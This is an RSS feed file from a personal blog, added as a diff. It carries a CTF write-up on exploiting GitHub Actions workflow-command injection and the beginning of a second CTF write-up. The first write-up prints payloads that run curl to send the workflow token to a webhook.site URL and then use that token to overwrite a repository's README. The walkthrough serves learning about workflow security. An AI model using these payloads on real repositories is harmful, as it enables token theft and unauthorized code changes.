@@ -1,0 +1,900 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[ISnackable's Blog]]></title><description><![CDATA[A blog site created with GatsbyJS.]]></description><link>https://isnackable.github.io/</link><generator>RSS for Node</generator><lastBuildDate>Wed, 24 Mar 2021 16:25:18 GMT</lastBuildDate><item><title><![CDATA[A call to hacktion, a GitHub workflow CTF]]></title><description><![CDATA[Introduction “A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an…]]></description><link>https://isnackable.github.io//A-call-to-hacktion-a-github-workflow-ctf/</link><guid isPermaLink="false">https://isnackable.github.io//A-call-to-hacktion-a-github-workflow-ctf/</guid><content:encoded>&lt;h2&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;“A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an interesting vulnerability pattern that GitHub Security teams have seen out in the real world.&lt;/p&gt;
+&lt;p&gt;To solve the game, you will have to elevate your privileges from read-only to full write access on a designated game repository!&lt;/p&gt;
+&lt;h2&gt;My Process&lt;/h2&gt;
+&lt;p&gt;Okay, so we know that this challenge resolves around the GitHub Workflow, the vulnerability is probably in the workflow file.&lt;/p&gt;
+&lt;h4&gt;Content of &lt;strong&gt;comment-logger.yml&lt;/strong&gt;:&lt;/h4&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
+      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;name: log and process issue comments
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  issue_comment:
+    name: log issue comment
+    runs-on: ubuntu-latest
+    steps:
+      - id: comment_log
+        name: log issue comment
+        uses: actions/github-script@v3
+        env:
+          COMMENT_BODY: ${{ github.event.comment.body }}
+          COMMENT_ID: ${{ github.event.comment.id }}
+        with:
+          github-token: &amp;quot;deadc0de&amp;quot;
+          script: |
+            console.log(process.env.COMMENT_BODY)
+            return process.env.COMMENT_ID
+          result-encoding: string
+      - id: comment_process
+        name: process comment
+        uses: actions/github-script@v3
+        timeout-minutes: 1
+        if: ${{ steps.comment_log.outputs.COMMENT_ID }}
+        with:
+          script: |
+            const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
+            return &amp;quot;&amp;quot;
+          result-encoding: string&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. &lt;/p&gt;
+&lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;After reading the syntax, I realised this this workflow will the process describe in the workflow configuration when there is a new comment on an issue. With that knowledge, I figured that I should create a new issue and play around and see the logs on the workflow.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-9058b.jpeg&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABhiwD/8QAFBABAAAAAAAAAAAAAAAAAAAAIP/aAAgBAQABBQJf/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAFBABAAAAAAAAAAAAAAAAAAAAIP/aAAgBAQAGPwJf/8QAFxAAAwEAAAAAAAAAAAAAAAAAARARIP/aAAgBAQABPyGlXH//2gAMAwEAAgADAAAAEMcf/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPxA//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPxA//8QAGxAAAgEFAAAAAAAAAAAAAAAAAREAICExUbH/2gAIAQEAAT8QYLGB5PY26P/Z&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;new-issue&quot;
+        title=&quot;&quot;
+        src=&quot;/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-78f2b.jpeg&quot;
+        srcset=&quot;/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-dce19.jpeg 200w,
+/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-c1413.jpeg 400w,
+/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-78f2b.jpeg 800w,
+/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-ab4c4.jpeg 1200w,
+/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-bc99b.jpeg 1600w,
+/static/new-issue-07c2850a17bcaed4744e2ac5573ba6cd-9058b.jpeg 1788w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Then I proceed to make a new commnet under the newly created issue, “test issue”. I noticed that an action was ran after my comment, so I clicked on the action and tried to see the log.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/github-action-log-91260ccd7b13924db70ad89d36f93086-9058b.jpeg&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAECBf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAAHiZLKg/8QAFBABAAAAAAAAAAAAAAAAAAAAIP/aAAgBAQABBQJf/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAFBABAAAAAAAAAAAAAAAAAAAAIP/aAAgBAQAGPwJf/8QAFhABAQEAAAAAAAAAAAAAAAAAEQAg/9oACAEBAAE/IWZx/9oADAMBAAIAAwAAABBk3//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QP//EABkQAQADAQEAAAAAAAAAAAAAAAEAEVEQIf/aAAgBAQABPxBSPqS2svrHv//Z&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;github-action-log&quot;
+        title=&quot;&quot;
+        src=&quot;/static/github-action-log-91260ccd7b13924db70ad89d36f93086-78f2b.jpeg&quot;
+        srcset=&quot;/static/github-action-log-91260ccd7b13924db70ad89d36f93086-dce19.jpeg 200w,
+/static/github-action-log-91260ccd7b13924db70ad89d36f93086-c1413.jpeg 400w,
+/static/github-action-log-91260ccd7b13924db70ad89d36f93086-78f2b.jpeg 800w,
+/static/github-action-log-91260ccd7b13924db70ad89d36f93086-ab4c4.jpeg 1200w,
+/static/github-action-log-91260ccd7b13924db70ad89d36f93086-bc99b.jpeg 1600w,
+/static/github-action-log-91260ccd7b13924db70ad89d36f93086-9058b.jpeg 1788w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input.&lt;/p&gt;
+&lt;p&gt;Link: &lt;a href=&quot;https://securitylab.github.com/research/github-actions-untrusted-input&quot;&gt;https://securitylab.github.com/research/github-actions-untrusted-input&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
+      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;- id: comment_log
+env:
+    COMMENT_BODY: ${{ github.event.comment.body }} // I CAN CONTROL
+    COMMENT_ID: ${{ github.event.comment.id }}
+    script: |
+    console.log(process.env.COMMENT_BODY) // MY INPUT, CAN I INJECT CODE HERE?
+    return process.env.COMMENT_ID
+    result-encoding: string
+
+- id: comment_process
+if: ${{ steps.comment_log.outputs.COMMENT_ID }}
+with:
+    script: |
+    const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
+    return &amp;quot;&amp;quot;
+    result-encoding: string&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;Looking at the workflow file again, I see that my input (&lt;em&gt;comment_body&lt;/em&gt;), is flows to &lt;code class=&quot;language-text&quot;&gt;console.log(process.env.COMMENT_BODY)&lt;/code&gt;. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, &lt;code class=&quot;language-text&quot;&gt;&amp;#39;&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;&amp;quot;&lt;/code&gt; to see if there is any error generated. &lt;/p&gt;
+&lt;p&gt;And did it work? Of course that didn’t work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn’t work as there is no template here.&lt;/p&gt;
+&lt;p&gt;Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. &lt;/p&gt;
+&lt;p&gt;Which somehow, I did. I found out that there is something called “workflow command”, not sure what that is, I read the website and noticed that a workflow command was passed in a &lt;code class=&quot;language-text&quot;&gt;console.log&lt;/code&gt;. I tried doing the same thing just to see what will happen.&lt;/p&gt;
+&lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::save-state name=processID::12345&lt;/code&gt;. This workflow command create environment variables named STATE&lt;em&gt;processID with the value of 12345. I thought that this command could modify the COMMAND&lt;/em&gt;ID, so I replace “processID” with “COMMAND&lt;em&gt;ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an enviroment variable and prepend “STATE&lt;/em&gt;“.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
+      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;if: ${{ steps.comment_log.outputs.COMMENT_ID }}&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;Back to the workflow file again, I noticed that if I wanted the next step to run, the commet&lt;em&gt;log needed to output the COMMENT&lt;/em&gt;ID, right? Note: &lt;em&gt;Not really, &lt;code class=&quot;language-text&quot;&gt;steps.comment_log.outputs.COMMENT_ID&lt;/code&gt; is actually just the value of the output from the comment_log step.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;With that, I’m going to skip my painstaking redundant effort to try to get “COMMNET&lt;em&gt;BODY” to be the value of “COMMENT&lt;/em&gt;ID”.&lt;/p&gt;
+&lt;p&gt;Now, another workflow command is &lt;code class=&quot;language-text&quot;&gt;::set-output name=action_fruit::strawberry&lt;/code&gt;. This workflow command set the value output of “action&lt;em&gt;fruit” to “strawberry”. Understanding this command, I tried to set the output value of commnet&lt;/em&gt;log, “COMMNET_ID” to “true” after learning that expression in the &lt;code class=&quot;language-text&quot;&gt;if&lt;/code&gt; statement will be evaluated as an expression. &lt;/p&gt;
+&lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true&lt;/code&gt;. Finally, I started to see progress. Quickly, I know that command injection is possible, as this input is treated as an expression as part of the variable declaration.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;
+      &lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; id &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;comment_log&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;outputs&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;COMMENT_ID&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-9058b.jpeg&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 52.57270693512305%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAQAF/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAH/2gAMAwEAAhADEAAAAcQixiP/xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAEFAl//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAY/Al//xAAWEAEBAQAAAAAAAAAAAAAAAAARECD/2gAIAQEAAT8hY4//2gAMAwEAAgADAAAAEAff/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPxA//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPxA//8QAGRAAAwEBAQAAAAAAAAAAAAAAAAERYRAx/9oACAEBAAE/EKacpXpWj87/AP/Z&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;github-action-log-process&quot;
+        title=&quot;&quot;
+        src=&quot;/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-78f2b.jpeg&quot;
+        srcset=&quot;/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-dce19.jpeg 200w,
+/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-c1413.jpeg 400w,
+/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-78f2b.jpeg 800w,
+/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-ab4c4.jpeg 1200w,
+/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-bc99b.jpeg 1600w,
+/static/github-action-log-process-d9c63a49caff388a99d476e2763e3e6b-9058b.jpeg 1788w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Time to print out the enviroment variables, which contains the GITHUB TOKEN for READ/WRITE access according to the GitHub workflow documentation. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;console.log(process.env);&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-53225.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 49.32291666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsSAAALEgHS3X78AAABIElEQVQoz4WSy3aDMAxE2YUCfmIb8yyQRdP//8CpBIUkDaGLOTLi+DIjkZRxgPEthImkClXzCdcMSIVFJkm/NT8Q9wvtIG2FXDkYVyOxdQ9fj9AElTaiDC1u1xumboajsywjFF0otD/VDixUoAdurlWoEnM/oa86SDp/FBpprv7VJZMQukTCMTcxlCOEboKn6PxFacISj8FnuhBU0N1kA63VL81mmCl6s85JmCeX2/kFuDg8BHpEcuhiD+ubHbjpHfQUWNMMYzsSeFyg0tCMaZ7s+K/TNL8DlfWvQFYgmKlaaBd3KRugy2oBH85wAYZnIG/ZUPN7uOKL3MXYwdKvwy6Nr3dxtMcNvwVy5a1qiihodtnuwKyzfFRxF79jMCf4Af987h5kngkiAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;github-action-leak-env&quot;
+        title=&quot;&quot;
+        src=&quot;/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-48538.png&quot;
+        srcset=&quot;/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-bed0f.png 200w,
+/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-5fd34.png 400w,
+/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-48538.png 800w,
+/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-b70ec.png 1200w,
+/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-d134a.png 1600w,
+/static/github-action-leak-env-53c98724bd149f1df9da94ac54d206ae-53225.png 1920w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;However, the GitHub token is masked, therefore we cannot just see it. Also, later on, I would realised the the token is only valid while the action is being run. Therefore, even if I could copy and token, it would be useless later.&lt;/p&gt;
+&lt;p&gt;I then used some website to recieve request, thinking that I could append the token as part of the URL, just to validate the token exists. My input: &lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&amp;#39;child_process&amp;#39;).execSync; code = execSync(&amp;#39;curl https://webhook.site/REDACTED?token=&amp;#39; + process.env[&amp;quot;INPUT_GITHUB-TOKEN&amp;quot;]);&lt;/code&gt;. I did the same for “ACTIONS&lt;em&gt;RUNTIME&lt;/em&gt;TOKEN”.&lt;/p&gt;
+&lt;p&gt;After verifying that the token exists, all I had to do is to make a request using GitHub API with the token to commit to the “README.md” file. I spent quite a few time researching the API but the solution is below.&lt;/p&gt;
+&lt;h2&gt;My Solution&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;::set-output name=COMMENT_ID::true ;const execSync = require(&amp;#39;child_process&amp;#39;).execSync; code = execSync(`curl -i --request PUT --url https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/contents/README.md --header &amp;#39;authorization: Bearer ${process.env[&amp;quot;INPUT_GITHUB-TOKEN&amp;quot;]}&amp;#39; --header &amp;#39;content-type: application/json&amp;#39; --data &amp;#39;{ &amp;quot;message&amp;quot;: &amp;quot;PWNED!!!!&amp;quot;, &amp;quot;content&amp;quot;: &amp;quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&amp;quot;, &amp;quot;sha&amp;quot;: &amp;quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&amp;quot; }&amp;#39; --fail`);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/pwned-df318590ef8b7004e03ad93a396ac7b1-9058b.jpeg&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 49.27293064876958%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAEF/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAH/2gAMAwEAAhADEAAAAcRFgH//xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAEFAl//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAUEAEAAAAAAAAAAAAAAAAAAAAg/9oACAEBAAY/Al//xAAWEAEBAQAAAAAAAAAAAAAAAAARECD/2gAIAQEAAT8hY4//2gAMAwEAAgADAAAAEAcf/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPxA//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPxA//8QAGhAAAgIDAAAAAAAAAAAAAAAAAREAICFRwf/aAAgBAQABPxAYFkxhdjbp/9k=&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;pwned&quot;
+        title=&quot;&quot;
+        src=&quot;/static/pwned-df318590ef8b7004e03ad93a396ac7b1-78f2b.jpeg&quot;
+        srcset=&quot;/static/pwned-df318590ef8b7004e03ad93a396ac7b1-dce19.jpeg 200w,
+/static/pwned-df318590ef8b7004e03ad93a396ac7b1-c1413.jpeg 400w,
+/static/pwned-df318590ef8b7004e03ad93a396ac7b1-78f2b.jpeg 800w,
+/static/pwned-df318590ef8b7004e03ad93a396ac7b1-ab4c4.jpeg 1200w,
+/static/pwned-df318590ef8b7004e03ad93a396ac7b1-bc99b.jpeg 1600w,
+/static/pwned-df318590ef8b7004e03ad93a396ac7b1-9058b.jpeg 1788w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;h2&gt;Results&lt;/h2&gt;
+&lt;p&gt;GitHub Capture the Flag results: &lt;a href=&quot;https://github.blog/2021-03-22-github-ctf-results/&quot;&gt;https://github.blog/2021-03-22-github-ctf-results/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Note: &lt;em&gt;The results website shows a different step taken to solve this challenge, go ahead and read it as I think it’s nicer and cleaner solution overall compared to mine.&lt;/em&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[CDDC2020 CTF Writeup]]></title><description><![CDATA[WARP GATE FIVE Web-1  No Time 
+ We were given a website that has a countdown, viewing the page source and the flag was in a comment Crypto-…]]></description><link>https://isnackable.github.io//CDDC2020/</link><guid isPermaLink="false">https://isnackable.github.io//CDDC2020/</guid><content:encoded>&lt;h2&gt;WARP GATE FIVE&lt;/h2&gt;
+&lt;h3&gt;[Web-1] No Time&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/No_Time-b3dfb6613c5606d903a970fa986425e9-fdcf4.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 49.19144496609285%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACT0lEQVQoz12Q609ScRjH+V/KTEu7bm0t81KW3ayseRdEIBQ4yOWAIJcDhzsiiCjC1Frm3GxuzbXVetOr/q9PD2Jb9eKz77Nzft/P7znHkE7tUq0ekcnsocV3SCQaJDRJ7e9soMl8RvxfYrEdkokm37/9otE4waDL4ay+S0prkpQDyXjjPP+fRR47JyqXREXYItLOXGofXRyGpDxIROq0Uo+2+TOfvVutownx8PYZsZCkEAnWWA3UCPmrBLwVvEoJn3tdNgxL+Zxki1CbqFojIoS8VVSljOou43Ot41fWUex5vM4Sy441nPYCdmsOizmD0ahjSEk5tSLCFkHZVIj6qlQLn6jkDtjZOOZ94wvF1AcqxUOy2j4f97+iusoo74o4rHkWLTmWLHkspjSGjIjSwTapQJ1US+ip0qwcUy8dcdA85eTwB5v5Q/Y2T9gqHnH6+Scht3ymfY1lkbptBRRrgSVzVoQiyagi8m+j+7dI+lrUiCobrDrLBKXkl4Iq6ZEtvFJ0zKVRzDkWjWmsMzrmSY35CQ3jeBxD2ruF7qmRWN5Ec1eJuUS0VGbFXkK1FfEs5HG3yrNpTOMaE6/CvB0N8WJE5ckjH48fehgcVOgfULjfr2CIOzcI2+VnW6RsLuCcy2Kb0lkYTzD1Osqb561ygJFhHwNS6Otzcfeek9t37PTestJ9fZ7OHiMdV2a50D2NwTefxzGTxjahYxyLM/kywtizEKMjQZ4OqwwP+Xgw5GVgyMM1EfTcsNB700JXr4nLV010iqija5qOy9NcvDTJb++J38PkzL2cAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
